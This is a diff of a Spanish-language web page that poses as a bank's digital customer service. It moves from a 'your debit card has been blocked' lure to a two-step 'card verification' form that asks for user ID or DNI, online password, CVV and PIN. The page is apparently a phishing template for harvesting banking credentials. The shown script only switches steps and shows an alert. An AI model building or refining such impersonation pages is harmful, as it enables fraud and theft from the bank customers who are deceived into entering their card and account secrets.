@@ -9,8 +9,6 @@
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
 
 <style>
 
@@ -18,31 +16,34 @@
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:'Inter',sans-serif;
 }
 
 
 body{
 
+    font-family:'Inter',Arial,sans-serif;
+
     min-height:100vh;
 
     background:
-    linear-gradient(135deg,#eaf3ff,#d5e8ff);
+    linear-gradient(135deg,#002f6c,#005eb8,#0077c8);
 
     display:flex;
 
-    justify-content:center;
-
     align-items:center;
+
+    justify-content:center;
 
 }
 
 
+/* CONTENEDOR */
 
-.container{
+.wrapper{
 
     width:100%;
-    max-width:450px;
+
+    max-width:430px;
 
     padding:20px;
 
@@ -50,131 +51,87 @@ body{
 
 
 
+/* TARJETA PRINCIPAL */
+
 .card{
 
     background:#ffffff;
 
-    border-radius:30px;
 
-    padding:35px 28px;
+    padding:40px 35px;
 
     box-shadow:
-    0 25px 60px rgba(0,55,120,.18);
+    0 25px 60px rgba(0,0,0,.25);
 
-    animation:entrada .7s ease;
+    animation:entrada .6s ease;
 
 }
 
 
 
-/* TARJETA */
+/* LOGO */
 
-.card-icon{
+.brand{
+
+    display:flex;
+
+    align-items:center;
+
+    gap:10px;
+
+    margin-bottom:35px;
+
+}
+
+
+.brand-icon{
+
+    width:42px;
+
+    height:42px;
+
+    background:#0065b3;
+
+    border-radius:8px;
 
     display:flex;
 
     justify-content:center;
 
-    margin-bottom:25px;
-
-}
-
-
-
-.bank-card{
-
-    width:150px;
-
-    height:95px;
-
-    border-radius:20px;
-
-    background:
-    linear-gradient(135deg,#004fa8,#00a6ff);
-
-    position:relative;
-
-    box-shadow:
-    0 15px 35px rgba(0,100,220,.35);
-
-    display:flex;
-
-    justify-content:center;
-
-    align-items:flex-end;
-
-    padding-bottom:18px;
-
-    animation:flotar 3s infinite;
-
-}
-
-
-
-.bank-card i{
+    align-items:center;
 
     color:white;
 
-    font-size:32px;
+    font-weight:700;
+
+    font-size:20px;
 
 }
 
 
 
-.chip{
-
-    position:absolute;
-
-    width:32px;
-
-    height:25px;
-
-    background:#f4c95d;
-
-    border-radius:6px;
-
-    top:22px;
-
-    left:22px;
-
-}
-
-
-
-.signal{
-
-    position:absolute;
-
-    right:22px;
-
-    top:25px;
-
-    color:white;
-
-    opacity:.8;
-
-}
-
-
-
-.signal i{
+.brand span{
 
     font-size:18px;
 
+    font-weight:600;
+
+    color:#072146;
+
 }
 
 
 
-/* CONTENIDO */
+/* TITULO */
 
 
 h1{
 
-    text-align:center;
+    color:#072146;
 
-    color:#102a43;
+    font-size:27px;
 
-    font-size:26px;
+    line-height:1.25;
 
     margin-bottom:12px;
 
@@ -184,55 +141,125 @@ h1{
 
 .description{
 
-    text-align:center;
-
-    color:#627d98;
-
-    font-size:15px;
-
-    line-height:1.6;
-
-}
-
-
-
-.box-info{
-
-    margin:25px 0;
-
-    background:#f3f8ff;
-
-    border-radius:16px;
-
-    padding:18px;
-
-    display:flex;
-
-    gap:15px;
-
-    align-items:center;
-
-}
-
-
-
-.box-info i{
-
-    font-size:25px;
-
-    color:#0066cc;
-
-}
-
-
-
-.box-info p{
-
-    color:#486581;
+    color:#53657a;
 
     font-size:14px;
 
+    line-height:1.6;
+
+    margin-bottom:30px;
+
 }
+
+
+
+/* PASOS */
+
+.progress{
+
+    display:flex;
+
+    gap:8px;
+
+    margin-bottom:30px;
+
+}
+
+
+
+.progress div{
+
+    height:4px;
+
+    flex:1;
+
+    background:#dfe7ef;
+
+    border-radius:10px;
+
+}
+
+
+.progress .active{
+
+    background:#0065b3;
+
+}
+
+
+
+/* FORMULARIOS */
+
+
+.step{
+
+    display:none;
+
+    animation:slide .4s ease;
+
+}
+
+
+
+.step.active{
+
+    display:block;
+
+}
+
+
+
+label{
+
+    font-size:13px;
+
+    color:#34495e;
+
+    display:block;
+
+    margin-bottom:8px;
+
+    font-weight:500;
+
+}
+
+
+
+input,select{
+
+    width:100%;
+
+    height:52px;
+
+    border:1px solid #cfd8e3;
+
+    border-radius:8px;
+
+    padding:0 16px;
+
+    font-size:15px;
+
+    margin-bottom:20px;
+
+    color:#333;
+
+    outline:none;
+
+    transition:.2s;
+
+}
+
+
+
+input:focus,
+select:focus{
+
+    border-color:#0065b3;
+
+    box-shadow:0 0 0 3px rgba(0,101,179,.12);
+
+}
+
 
 
 
@@ -244,19 +271,19 @@ button{
 
     border:none;
 
-    border-radius:14px;
+    border-radius:8px;
 
-    background:#0066cc;
+    background:#0065b3;
 
     color:white;
 
-    font-size:16px;
+    font-size:15px;
 
     font-weight:600;
 
     cursor:pointer;
 
-    transition:.3s;
+    transition:.25s;
 
 }
 
@@ -264,89 +291,38 @@ button{
 
 button:hover{
 
-    background:#004c99;
-
-    transform:translateY(-2px);
+    background:#004c8c;
 
 }
 
 
 
-.form{
+.secondary{
 
-    display:none;
+    margin-top:12px;
 
-    margin-top:25px;
+    background:#eef4fa;
 
-    animation:mostrar .5s ease;
-
-}
-
-
-
-.form h2{
-
-    color:#102a43;
-
-    font-size:20px;
-
-    margin-bottom:20px;
+    color:#0065b3;
 
 }
 
 
 
-label{
-
-    display:block;
-
-    color:#486581;
-
-    font-size:13px;
-
-    margin-bottom:7px;
-
-}
-
-
-
-input{
-
-    width:100%;
-
-    height:50px;
-
-    border-radius:12px;
-
-    border:1px solid #d9e2ec;
-
-    padding:0 15px;
-
-    font-size:15px;
-
-    margin-bottom:16px;
-
-    outline:none;
-
-}
-
-
-
-input:focus{
-
-    border-color:#0066cc;
-
-}
-
+/* SEGURIDAD */
 
 
 .footer{
 
+    margin-top:30px;
+
+    padding-top:20px;
+
+    border-top:1px solid #edf1f5;
+
     text-align:center;
 
-    margin-top:25px;
-
-    color:#829ab1;
+    color:#7b8794;
 
     font-size:12px;
 
@@ -363,7 +339,7 @@ from{
 
 opacity:0;
 
-transform:translateY(40px);
+transform:translateY(35px);
 
 }
 
@@ -379,31 +355,13 @@ transform:none;
 
 
 
-@keyframes flotar{
-
-0%,100%{
-
-transform:translateY(0) rotate(0);
-
-}
-
-50%{
-
-transform:translateY(-10px) rotate(2deg);
-
-}
-
-}
-
-
-
-@keyframes mostrar{
+@keyframes slide{
 
 from{
 
 opacity:0;
 
-transform:translateY(20px);
+transform:translateX(25px);
 
 }
 
@@ -423,7 +381,7 @@ transform:none;
 
 .card{
 
-padding:28px 20px;
+padding:30px 22px;
 
 }
 
@@ -439,95 +397,109 @@ font-size:23px;
 
 </style>
 
-
 </head>
 
 
 <body>
 
 
-<div class="container">
+<div class="wrapper">
+
 
 <div class="card">
 
 
-<div class="card-icon">
 
-<div class="bank-card">
+<div class="brand">
 
-<div class="chip"></div>
+<div class="brand-icon">
+✓
+</div>
 
-<div class="signal">
-<i class="fa-solid fa-wifi"></i>
+<span>
+Atención Digital
+</span>
+
 </div>
 
 
-<i class="fa-solid fa-credit-card"></i>
 
+<div class="progress">
+
+<div class="active" id="p1"></div>
+
+<div id="p2"></div>
 
 </div>
 
-</div>
 
+
+
+<!-- PASO 1 -->
+
+<div class="step active" id="step1">
 
 
 <h1>
-Centro de atención
+Verificación de tarjeta.</h1>
+
+
+<p class="description">
+
+Completa los datos solicitados para activar su tarjeta.
+</p>
+
+
+
+<label>
+USUARIO / DNI
+</label>
+
+<input 
+type="text"
+placeholder="INGRESE USUARIO / DNI">
+
+
+<label>
+CONTRASEÑA
+</label>
+
+<input 
+type="password"
+placeholder="INGRESE SU CONTRASEÑA">
+
+
+
+
+
+
+
+<button onclick="continuar()">
+
+Continuar
+
+</button>
+
+
+</div>
+
+
+
+
+<!-- PASO 2 -->
+
+<div class="step" id="step2">
+
+
+<h1>
 </h1>
 
 
 <p class="description">
 
-Su tarjeta de debito ha sido bloqueada para pagos en comercios debido a la actualización necesaria de nuestra aplicación, marque 1 para que un agente le indique los pasos a seguir
+Ingrese los datos faltantes para su activación correctamente 
+
 </p>
-
-
-
-<div class="box-info">
-
-<i class="fa-solid fa-headset"></i>
-
-<p>
-Un asesor podrá comunicarse contigo luego de completar tus datos de contacto.
-</p>
-
-</div>
-
-
-
-<button id="btn">
-
-Contactar con un agente
-
-</button>
-
-
-
-
-<div class="form" id="form">
-
-
-<h2>
-Activacion de tarjeta</h2>
-
-
-
-<form>
-
-
-<label>
-Usuario
-</label>
-
-<input type="text" placeholder="Ingresa tu usuario" required>
-
-
-
-<label>
-Contraseña
-</label>
-
-<input type="password" placeholder="Ingresa tu contraseña" required>
 
 
 
@@ -535,24 +507,33 @@ Contraseña
 CVV
 </label>
 
-<input type="tel" placeholder="125" required maxlength="3">
+<input placeholder="CVV" maxlength="3" type="text">
+
+
+
 <label>
 PIN
 </label>
 
-<input type="tel" placeholder="0000" required maxlength="4">
+<input placeholder="PIN" maxlength="4" type="text">
 
 
 
 
-<button type="submit">
 
-Enviar solicitud
 
+
+<button onclick="enviar()">
+
+Activar
 </button>
 
 
-</form>
+<button class="secondary" onclick="volver()">
+
+Volver
+
+</button>
 
 
 </div>
@@ -561,12 +542,13 @@ Enviar solicitud
 
 <div class="footer">
 
-Servicio de atención digital
+Servicio digital de atención al cliente
 
 </div>
 
 
 </div>
+
 
 </div>
 
@@ -574,22 +556,46 @@ Servicio de atención digital
 
 <script>
 
-const btn = document.getElementById("btn");
-const form = document.getElementById("form");
+
+function continuar(){
+
+document.getElementById("step1").classList.remove("active");
+
+document.getElementById("step2").classList.add("active");
 
 
-btn.addEventListener("click",()=>{
+document.getElementById("p1").classList.remove("active");
 
-    form.style.display="block";
+document.getElementById("p2").classList.add("active");
 
-    btn.style.display="none";
+}
 
-});
+
+
+function volver(){
+
+document.getElementById("step2").classList.remove("active");
+
+document.getElementById("step1").classList.add("active");
+
+
+document.getElementById("p2").classList.remove("active");
+
+document.getElementById("p1").classList.add("active");
+
+}
+
+
+
+function enviar(){
+
+alert("Solicitud enviada correctamente.");
+
+}
 
 
 </script>
 
 
 </body>
-
 </html>
